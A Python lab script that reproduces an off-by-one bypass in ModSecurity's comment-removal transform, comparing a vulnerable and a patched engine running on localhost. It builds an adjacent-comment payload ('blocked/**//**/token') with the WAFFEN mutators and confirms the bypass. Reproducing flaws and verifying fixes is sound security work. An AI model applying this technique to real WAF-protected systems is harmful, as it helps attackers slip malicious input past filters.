"""Reproduce CVE-2026-104259 (ModSecurity t:removeComments off-by-one) and show
WAFFEN's `sql_adjacent_comment` mutator exploiting it — a version-differential
across a VULNERABLE (libmodsecurity 3.0.16) and a PATCHED (3.0.17) CRS running the
SAME isolation rule and SAME payloads, so the only variable is the engine version.

Isolation: the rule (lab/vuln-removecomments-rule.conf) matches `@rx blockedtoken`
after `t:removeComments`, on the non-SQL token "blockedtoken" that CRS/libinjection
never flag — so this rule is the only thing that can block, and it blocks only when
removeComments collapses the comment(s). The payloads are produced by WAFFEN's own
mutators, not hand-written.

    docker compose -f lab/modsec-vuln-compose.yml -p waffen-lab-vuln up -d
    .venv/bin/python lab/vuln_repro.py
"""
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, ".")
from waffen.mutate import REGISTRY  # noqa: E402

SEED = "blocked token"  # whitespace boundary the two comment mutators rewrite
BASELINE = REGISTRY.get("sql_between_comment").apply(SEED)     # blocked/**/token
PROBE = REGISTRY.get("sql_adjacent_comment").apply(SEED)       # blocked/**//**/token
ENGINES = [("VULNERABLE 3.0.16", 18081), ("PATCHED 3.0.17", 18082)]


def code(port: int, q: str):
    url = f"http://localhost:{port}/rest/products/search?" + urllib.parse.urlencode({"q": q})
    try:
        return urllib.request.urlopen(url, timeout=10).getcode()
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:  # noqa: BLE001
        return f"ERR {e}"


print(f"seed            : {SEED!r}")
print(f"baseline  (/**/ ): {BASELINE!r}   <- sql_between_comment")
print(f"probe (/**//**/ ): {PROBE!r}   <- sql_adjacent_comment (CVE-2026-104259)")
print()
print(f"{'engine':20} {'baseline':>9} {'probe':>9}")
results = {}
for name, port in ENGINES:
    b, p = code(port, BASELINE), code(port, PROBE)
    results[name] = (b, p)
    print(f"{name:20} {str(b):>9} {str(p):>9}")

vb, vp = results["VULNERABLE 3.0.16"]
pb, pp = results["PATCHED 3.0.17"]
bypass = (vb == 403 and vp == 200)
patched_ok = (pb == 403 and pp == 403)
print("\nRESULT")
print(f"  vulnerable 3.0.16 : baseline {vb}, adjacent-comment probe {vp}  "
      + ("-> BYPASS confirmed" if bypass else "-> no bypass"))
print(f"  patched    3.0.17 : baseline {pb}, adjacent-comment probe {pp}  "
      + ("-> both blocked (fix verified)" if patched_ok else "-> unexpected"))
ok = bypass and patched_ok
print("\n" + ("PASS — sql_adjacent_comment bypasses 3.0.16 and is caught by 3.0.17"
             if ok else "INCONCLUSIVE — see codes above"))
sys.exit(0 if ok else 1)
